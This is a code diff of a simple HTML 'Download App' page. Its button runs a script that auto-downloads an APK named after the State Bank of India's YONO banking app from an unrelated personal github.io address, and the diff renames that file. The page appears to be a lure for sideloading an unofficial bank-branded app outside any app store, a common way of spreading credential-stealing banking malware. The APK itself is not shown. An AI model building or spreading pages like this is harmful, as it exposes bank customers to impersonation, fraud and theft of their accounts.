@@ -1,49 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Download App</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding-top: 100px;
       background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 0.5em;
+    }
+
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 1.5em;
+      padding: 0 20px;
+    }
+
     .download-button {
-      font-size: 20px;
+      font-size: 1.2rem;
       padding: 15px 30px;
       background-color: #28a745;
       color: white;
       border: none;
       border-radius: 10px;
       cursor: pointer;
+      width: 80%;
+      max-width: 300px;
     }
+
     .download-button:hover {
       background-color: #218838;
     }
   </style>
 </head>
 <body>
-
   <h1>Download App</h1>
   <p>Click the button below to download the latest APK file.</p>
-
   <button class="download-button" onclick="downloadApk()">Download APK</button>
 
   <script>
     function downloadApk() {
-      // Replace with your actual APK file URL
-      const apkUrl = "https://srxvvm.github.io/down/SBI_Yono.apk";
-
+      const apkUrl = "https://srxvvm.github.io/down/YonoSBI.apk";
       const a = document.createElement('a');
       a.href = apkUrl;
-      a.download = ''; // optional; prompts download
+      a.download = '';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
     }
   </script>
-
 </body>
 </html>
